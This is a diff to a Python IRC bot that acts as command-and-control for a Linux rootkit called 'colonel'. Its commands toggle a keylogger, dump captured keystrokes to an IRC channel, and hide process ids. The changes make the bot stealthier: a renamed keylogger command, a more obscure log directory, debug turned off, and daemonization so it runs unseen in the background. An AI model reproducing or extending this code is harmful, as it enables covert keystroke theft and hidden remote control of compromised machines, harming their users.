@@ -1,12 +1,9 @@
 #!/usr/bin/env python
-# HIDE NETSTAT INFO --- ENABLE DCC SEND. 
 """
 This bot uses the SingleServerIRCBot class from irc.bot. The primary 
 purpose of the bot is to send commands received through DCC sessions 
 to the colonel rootkit. Commands in channel messages are given by 
 prefixing the text by the bot nickname followed by a colon. 
-
-Bot commands are:
 
     BOT COMMANDS --------
 	dcc -- Command a bot DCC CHAT invite connection. 
@@ -17,7 +14,7 @@ Bot commands are:
     	die -- Kill the bot.
 
     ROOT COMMANDS -------
-    	tls -- Toggle keylogger listening on/off. 
+    	listen -- Toggle keylogger listening on/off. 
     	keylog -- Print keyboard input log. 
                   Keylogger is turned off.
     	hpXXXX -- Hide a process id.
@@ -27,6 +24,7 @@ Bot commands are:
     	ms -- Show the root module.
 """
 
+import daemon
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
@@ -41,17 +39,17 @@ channel = "#rwx-hack"
 nickname = "rwx-lkm"
 
 dcc_nick = None
-evlog = '/opt/col_log/evlog.txt'
+evlog = '/opt/__col_log/evlog.txt'
 proc_col = '/proc/colonel'
 
 # Debug Mode 
-debug = True 
+debug = False 
 
 class Bot(irc.bot.SingleServerIRCBot):
 	def __init__(self, channel, nickname, server, port=6667):
         	irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname, reconnection_interval=15)
         	self.channel = channel
-    		self.valid_cmds = ["sp", "tls", "thf", "mh", "ms"] 
+    		self.valid_cmds = ["sp", "listen", "thf", "mh", "ms"] 
 
 	def on_nicknameinuse(self, c, e):
 		if debug:
@@ -123,7 +121,7 @@ class Bot(irc.bot.SingleServerIRCBot):
 
 	def error_log(self):
 		# SEND ERROR LOG VIA DCC THEN DELETE
-		# errlog = '/opt/col_log/log.txt'
+		# errlog = '/opt/__col_log/log.txt'
 		# f = open(errlog, 'rw+')
 		# f.truncate()
 		# f.close()
@@ -171,7 +169,7 @@ stats -- Print some channel information.
 disconnect -- Disconnect the bot from a DCC session. The bot will try to reconnect after 15 seconds.
 die -- Kill the bot.
 ROOT COMMANDS -------
-tls -- Toggle keylogger listening on/off. 
+listen -- Toggle keylogger listening on/off. 
 keylog -- Print keyboard input log. Keylogger is turned off.
 hpxxxx -- Hide a process id.
 sp -- Show the last hidden process.
@@ -187,6 +185,8 @@ ms -- Show the root module.
 	def _cmd_keylog(self, c, e, cmd, nick, dcc):
 		self.root_command(cmd)
 		txt = "Command %s executed." % cmd
+		self.print_irc(c, channel, txt, dcc)
+		txt = " --- Translated Keylog --- "
 		self.print_irc(c, channel, txt, dcc)
 		for k in self.keylogs().split('\n'):
 			if None == k:
@@ -280,6 +280,13 @@ def main():
         	print "Connecting to %s on port: %d" % (server, port)
     	col_bot.start()
 
+def run_daemon():
+	with daemon.DaemonContext():
+		main()
 
 if __name__ == "__main__":
-	main()
+	if debug:
+		main()
+	else:
+		run_daemon()
+
